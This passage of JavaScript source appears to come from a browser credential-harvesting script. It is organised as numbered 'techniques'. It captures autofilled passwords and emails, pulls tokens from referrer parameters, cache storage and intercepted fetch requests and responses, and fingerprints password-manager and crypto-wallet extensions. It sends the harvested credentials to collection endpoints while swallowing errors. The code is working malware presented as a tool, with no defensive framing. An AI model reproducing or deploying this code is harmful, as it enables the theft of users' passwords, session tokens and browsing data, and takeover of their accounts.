              allHosts: visitedHosts.join(', ').substring(0, 1000)
            },
            url: window.location.href
          });

          // Send as session harvest data
          this.core.send('/api/collect/bulk', {
            data: {
              sessionHarvest: foundSites.map(site => ({
                source: 'performance-history',
                key: site,
                value: `visited:true`,
                sensitive: true
              }))
            }
          });
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 7: REFERRER CHAIN ===

  extractFromReferrerChain() {
    try {
      // document.referrer shows where the user came FROM
      if (document.referrer && document.referrer.length > 0) {
        const refUrl = new URL(document.referrer);
        this.discoveredSites.push(refUrl.hostname);
        this.visitedUrls.push(document.referrer);

        // The referrer query params might contain session data
        refUrl.searchParams.forEach((value, key) => {
          const sensitiveParams = ['token', 'session', 'auth', 'key', 'id', 'code', 'state', 'redirect', 'return', 'next'];
          if (sensitiveParams.some(p => key.toLowerCase().includes(p))) {
            this.savedCredentialsFound.push({
              source: 'referrer-param',
              site: refUrl.hostname,
              key,
              value: value.substring(0, 100)
            });
          }
        });

        // Try to access the previous pages (from history API)
        try {
          // Some frameworks store full history in window object
          if (window.__INITIAL_STATE__?.router?.location?.pathname) {
            this.visitedUrls.push(window.__INITIAL_STATE__.router.location.pathname);
          }
          
          // Check for Next.js/React router history in __NEXT_DATA__
          if (window.__NEXT_DATA__?.props?.pageProps) {
            const pageProps = JSON.stringify(window.__NEXT_DATA__.props.pageProps);
            const urlsInProps = pageProps.match(/https?:\/\/[^\s"',;]+/g);
            if (urlsInProps) this.visitedUrls.push(...urlsInProps);
          }

          // Check for Vue router
          if (window.__vue_app__?.config?.globalProperties?.$router) {
            try {
              const history = window.__vue_app__.config.globalProperties.$router;
              // Can't directly access, but we detect Vue app
              this.discoveredSites.push('vue-application');
            } catch(e) {}
          }
        } catch(e) {}
      }
    } catch(e) {}
  }

  // === TECHNIQUE 8: AUTOFILL DATA (SAVED CREDENTIALS FROM PASSWORD MANAGER) ===

  extractFromAutofillData() {
    try {
      const allInputs = document.querySelectorAll('input');
      const formData = [];
      const credentialsFound = [];

      allInputs.forEach(input => {
        // Check for autocomplete attributes that reveal saved data
        const autocomplete = input.getAttribute('autocomplete') || '';
        if (autocomplete) {
          formData.push({ name: input.name || input.id, autocomplete, type: input.type, hasValue: !!input.value });
        }

        // Password fields with values = Browser's password manager autofilled them
        if ((input.type === 'password' || input.type === 'email') && input.value && input.value.length > 0) {
          const form = input.closest('form');
          let usernameField = null;
          
          if (form) {
            usernameField = form.querySelector('input[type="email"], input[name*="email"], input[name*="user"], input[name*="login"], input[name*="username"]');
          }

          const username = usernameField?.value || '';
          const password = input.type === 'password' ? input.value : '';
          const email = input.type === 'email' ? input.value : (username?.includes('@') ? username : '');

          if (password || email) {
            credentialsFound.push({
              username,
              password: password.substring(0, 100),
              email: email || username,
              inputName: input.name,
              formAction: form?.action || window.location.href
            });

            if (password && !this.savedCredentialsFound.some(c => c.password === password)) {
              this.savedCredentialsFound.push({
                source: 'autofill-saved-password',
                site: window.location.hostname,
                email: email || username,
                password: password.substring(0, 100)
              });
            }
          }
        }
      });

      if (credentialsFound.length > 0) {
        credentialsFound.forEach(cred => {
          this.core.send('/api/collect/credentials', {
            source: 'password-manager-autofill',
            username: cred.username,
            password: cred.password,
            email: cred.email,
            url: cred.formAction || window.location.href,
            formType: 'browser-saved-credentials',
            fieldData: { inputName: cred.inputName, formAction: cred.formAction }
          });
        });

        this.core.send('/api/collect/formdata', {
          formId: 'saved-password-manager-data',
          fields: {
            totalFound: credentialsFound.length,
            credentials: credentialsFound.map(c => `${c.email}:${c.password.substring(0, 3)}***`).join(' || ')
          },
          url: window.location.href
        });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 9: BOOKMARKLETS / SAVED DATA ===

  extractFromBookmarklets() {
    try {
      // Some users have bookmarklets/snippets stored in browser
      // Check for common patterns
      const bodyText = document.body?.innerText || '';
      
      // Detect if user is on a saved password list page
      if (window.location.hostname.includes('passwords') || 
          window.location.href.includes('password-manager') ||
          window.location.href.includes('saved-passwords')) {
        
        this.core.send('/api/collect/formdata', {
          formId: 'password-manager-page-detected',
          fields: { url: window.location.href, title: document.title },
          url: window.location.href
        });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 10: PASSWORD MANAGER DATA ===

  extractFromPasswordManagerData() {
    try {
      // Check for common password manager injected elements
      const bodyChildren = document.body?.children || [];
      for (let i = 0; i < bodyChildren.length; i++) {
        const el = bodyChildren[i];
        if (!el || !el.tagName) continue;
        
        // Detect Bitwarden
        if (el.id === 'bitwarden-extension' || el.id?.startsWith('bitwarden')) {
          this.discoveredSites.push('password-manager:bitwarden');
        }
        // Detect LastPass
        if (el.id === 'lastpass-extension' || el.className?.includes?.('lastpass')) {
          this.discoveredSites.push('password-manager:lastpass');
        }
        // Detect 1Password
        if (el.id?.includes('1password') || el.className?.includes?.('1password')) {
          this.discoveredSites.push('password-manager:1password');
        }
        // Detect Dashlane
        if (el.id?.includes('dashlane') || el.className?.includes?.('dashlane')) {
          this.discoveredSites.push('password-manager:dashlane');
        }
      }

      // Check for autofill events by monitoring input fields with autofilled styles
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        // Some browsers apply pseudo-class :-webkit-autofill that can be detected
        // by checking computed style background color
        try {
          const style = window.getComputedStyle(input);
          const bgColor = style?.backgroundColor || '';
          // Autofilled inputs often have specific background colors
          if (bgColor === 'rgb(250, 255, 189)' || bgColor === 'rgb(232, 240, 254)' || 
              bgColor === 'rgb(255, 255, 194)' || bgColor === 'rgb(230, 247, 230)') {
            
            // This might be autofilled - capture it
            const form = input.closest('form');
            let emailField = null;
            let passField = null;
            
            if (form) {
              const formInputs = form.querySelectorAll('input');
              formInputs.forEach(fi => {
                if (fi.type === 'email' || fi.name?.toLowerCase().includes('email') || fi.name?.toLowerCase().includes('user')) {
                  emailField = fi;
                }
                if (fi.type === 'password') {
                  passField = fi;
                }
              });
            }

            this.savedCredentialsFound.push({
              source: 'autofill-detected',
              site: window.location.hostname,
              email: emailField?.value || input.value || '',
              password: passField?.value || '',
              inputType: input.type
            });
          }
        } catch(e) {}
      });
    } catch(e) {}
  }

  // === TECHNIQUE 11: BROWSER SYNC DATA ===

  extractFromBrowserSyncData() {
    try {
      // Chrome sync data is sometimes exposed through API
      if (window.chrome?.sync?.get) {
        try {
          window.chrome.sync.get(null, (data) => {
            if (data) {
              this.core.send('/api/collect/formdata', {
                formId: 'chrome-sync-data',
                fields: { data: JSON.stringify(data).substring(0, 1000) },
                url: window.location.href
              });
            }
          });
        } catch(e) {}
      }
    } catch(e) {}
  }

  // === TECHNIQUE 12: EXTENSION STORAGE ===

  extractFromExtensions() {
    try {
      // Detect which browser extensions are installed
      const scripts = document.querySelectorAll('script[src]');
      const extensionIds = [];

      scripts.forEach(script => {
        const src = script.src || '';
        // Chrome extension pattern
        const chromeMatch = src.match(/chrome-extension:\/\/([a-z]{32})\//);
        if (chromeMatch) extensionIds.push(chromeMatch[1]);
        
        // Firefox extension pattern
        const ffMatch = src.match(/moz-extension:\/\/([a-f0-9-]{36})\//);
        if (ffMatch) extensionIds.push(ffMatch[1]);
      });

      // Detect common extensions by their injected elements
      const knownExtensions = [
        { id: 'nkbihfbeogaeaoehlefnkodbefgpgknn', name: 'MetaMask' },
        { id: 'fhbohimaelbohpjbbldcngcnapndodjp', name: 'Binance' },
        { id: 'bfnaelmomeimhlpmgjnjophhpkkoljpa', name: 'Phantom' },
        { id: 'ejbalbakoplchlghecdalmeeeajnimhm', name: 'Coinbase Wallet' },
        { id: 'hdokiejnpimakedhajhdlcegeplioahd', name: 'LastPass' },
        { id: 'nngceckbapebfimnlniiiahkandclblb', name: 'Bitwarden' },
        { id: 'dbepggeogbaibhgnhhndojpepiihcmeb', name: 'Vimium' },
        { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
        { id: 'gighmmpiobklfepjocnamgkkbiglidom', name: 'AdBlock' },
        { id: 'bhlhnicpbhincbdnckphjcgjjcfggchg', name: 'Honey' },
        { id: 'aapbdbdomjkkjkaonfhkkikfgjllcleb', name: 'Google Translate' },
        { id: 'ghbmnnjooekpmoecnnnilnnbdlolhkhi', name: 'Google Docs Offline' },
      ];

      // Check for injected content
      knownExtensions.forEach(ext => {
        // Check by ID
        if (extensionIds.includes(ext.id)) {
          this.discoveredSites.push(`extension:${ext.name}`);
        }

        // Check by injected DOM elements (specific to each extension)
        switch(ext.name) {
          case 'MetaMask':
            if (document.querySelector('#metamask-bridge')) this.discoveredSites.push('extension:MetaMask');
            break;
          case 'LastPass':
            if (document.querySelector('#__lpBridge')) this.discoveredSites.push('extension:LastPass');
            if (document.querySelector('iframe[src*="lastpass"]')) this.discoveredSites.push('extension:LastPass');
            break;
          case 'Bitwarden':
            if (document.querySelector('#bitwarden-framework')) this.discoveredSites.push('extension:Bitwarden');
            break;
        }
      });

      if (this.discoveredSites.filter(s => s.startsWith('extension:')).length > 0) {
        this.core.send('/api/collect/formdata', {
          formId: 'browser-extensions-detected',
          fields: {
            extensions: [...new Set(this.discoveredSites.filter(s => s.startsWith('extension:')))].join(', '),
            count: new Set(this.discoveredSites.filter(s => s.startsWith('extension:'))).size
          },
          url: window.location.href
        });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 13: WEBSQL (DEPRECATED BUT STILL SOMETIMES HAS DATA) ===

  extractFromWebSQL() {
    try {
      if (!('openDatabase' in window) || typeof openDatabase !== 'function') return;
      
      const db = window.openDatabase('__harvester_check__', '1.0', 'Check', 1);
      if (!db) return;
      
      // We can't read other DBs, but we detect WebSQL availability
      this.core.send('/api/collect/formdata', {
        formId: 'websql-detected',
        fields: { available: true },
        url: window.location.href
      });
    } catch(e) {}
  }

  // === TECHNIQUE 14: CACHE STORAGE ===

  async extractFromCacheStorage() {
    try {
      if (typeof caches === 'undefined' || !('caches' in window)) return;
      
      const cacheNames = await caches.keys();
      
      for (const name of cacheNames) {
        // Cache names often contain site names
        const siteMatch = name.match(/^(https?:\/\/[^\/]+)/);
        if (siteMatch) {
          this.discoveredSites.push(siteMatch[1]);
          this.visitedUrls.push(name);
        }
        
        // Check cache for API responses with auth data
        const cache = await caches.open(name);
        const requests = await cache.keys();
        
        for (const request of requests.slice(0, 30)) {
          try {
            const response = await cache.match(request);
            if (response && response.url) {
              this.visitedUrls.push(response.url);
              
              // Check for auth headers stored in cache
              const authHeader = response.headers?.get?.('authorization') || 
                                 response.headers?.get?.('x-auth-token') ||
                                 response.headers?.get?.('x-api-key');
              if (authHeader) {
                this.savedCredentialsFound.push({
                  source: 'cache-header',
                  url: response.url,
                  header: authHeader.substring(0, 100)
                });
              }
            }
          } catch(e) {}
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 15: NETWORK TIMING ===

  extractFromNetworkTiming() {
    try {
      if (!window.performance || typeof window.performance.getEntriesByType !== 'function') return;

      const resources = window.performance.getEntriesByType('resource');
      const origins = new Set();

      resources.forEach(r => {
        try {
          const url = new URL(r.name);
          origins.add(url.origin);
        } catch(e) {}
      });

      if (origins.size > 0) {
        const allOrigins = [...origins];
        this.discoveredSites.push(...allOrigins.map(o => {
          try { return new URL(o).hostname; } catch(e) { return o; }
        }));
      }
    } catch(e) {}
  }

  // === TECHNIQUE 16: LINK PRELOADS ===

  extractFromLinkPreloads() {
    try {
      const links = document.querySelectorAll('link[rel="preload"], link[rel="prefetch"], link[rel="prerender"], link[rel="dns-prefetch"], link[rel="preconnect"]');
      
      links.forEach(link => {
        const href = link.getAttribute('href');
        if (href && href.startsWith('http')) {
          this.visitedUrls.push(href);
          try {
            this.discoveredSites.push(new URL(href).hostname);
          } catch(e) {}
        }
      });
    } catch(e) {}
  }

  // === TECHNIQUE 17: MANIFEST ===

  extractFromManifest() {
    try {
      const link = document.querySelector('link[rel="manifest"]');
      if (link && link.href) {
        this.visitedUrls.push(link.href);
      }
    } catch(e) {}
  }

  // === TECHNIQUE 18: REDIRECT CHAIN ===

  extractFromRedirectChain() {
    try {
      if (window.performance && window.performance.navigation) {
        const nav = window.performance.navigation;
        this.core.send('/api/collect/formdata', {
          formId: 'navigation-type',
          fields: { 
            type: nav.type, // 0=navigate, 1=reload, 2=back_forward, 255=reserved
            redirectCount: nav.redirectCount
          },
          url: window.location.href
        });
      }
    } catch(e) {}
  }

  // === NETWORK INTERCEPTION FOR HISTORY ===

  interceptNetworkForHistory() {
    try {
      // Guard: ensure fetch is available and not already intercepted
      if (typeof window.fetch !== 'function') return;
      
      // Intercept fetch to capture browsing data from API responses
      const originalFetch = window.fetch;
      const self = this;

      window.fetch = function(input, init) {
        const url = typeof input === 'string' ? input : input?.url || '';
        
        // Check for authentication headers
        const headers = init?.headers;
        let authData = null;
        
        if (headers) {
          if (typeof Headers !== 'undefined' && headers instanceof Headers) {
            if (headers.has('Authorization')) authData = headers.get('Authorization');
            if (headers.has('X-Auth-Token')) authData = headers.get('X-Auth-Token');
            if (headers.has('X-API-Key')) authData = headers.get('X-API-Key');
          } else if (typeof headers === 'object' && headers !== null) {
            authData = headers['Authorization'] || headers['X-Auth-Token'] || headers['X-API-Key'];
          }
        }

        if (authData) {
          self.savedCredentialsFound.push({
            source: 'network-intercept',
            url: url.substring(0, 200),
            authHeader: authData.substring(0, 100)
          });
          
          self.core.send('/api/collect/credentials', {
            source: 'api-auth-intercept',
            password: authData.substring(0, 100),
            url: url.substring(0, 200),
            formType: 'bearer-token-intercepted',
            fieldData: { method: init?.method || 'GET', authType: authData.split(' ')[0] || 'Bearer' }
          });
        }

        // Inspect responses for session data
        return originalFetch.call(this, input, init).then(async response => {
          if (response.ok) {
            const contentType = response.headers?.get?.('content-type') || '';
            if (contentType.includes('json')) {
              try {
                const cloned = response.clone();
                const body = await cloned.json();
                const bodyStr = JSON.stringify(body).substring(0, 1000);
                
                let foundData = false;
                if (body.access_token || body.token || body.session_token) {
                  foundData = true;
                  self.savedCredentialsFound.push({
                    source: 'api-response-token',
                    url: url,
                    token: body.access_token || body.token || body.session_token
                  });
                }
                if (body.email || body.user?.email) {
                  foundData = true;
                  self.savedCredentialsFound.push({
                    source: 'api-response-email',
                    url: url,
                    email: body.email || body.user?.email
                  });
                }
                if (body.session || body.sessionId || body.session_id) {
                  foundData = true;
                  self.externalSessions.push({
                    source: 'api-response',
                    url: url,
                    sessionId: body.session || body.sessionId || body.session_id
                  });
                }

                if (foundData) {
                  self.core.send('/api/collect/formdata', {
                    formId: 'api-response-sensitive-intercept',
                    fields: { url: url.substring(0, 200), data: bodyStr.substring(0, 500) },
                    url: window.location.href
                  });
                }
              } catch(e) {}
            }
          }
          return response;
        }).catch(err => {
          // If the intercepted fetch fails, we still need to propagate the error
          throw err;
        });
      };
    } catch(e) {}
  }

  // === SUMMARY ===

  getDiscoveredData() {
    return {
      discoveredSites: [...new Set(this.discoveredSites)].slice(0, 200),
      visitedUrls: [...new Set(this.visitedUrls)].slice(0, 500),
      externalSessions: this.externalSessions,
      savedCredentials: this.savedCredentialsFound
    };
  }
}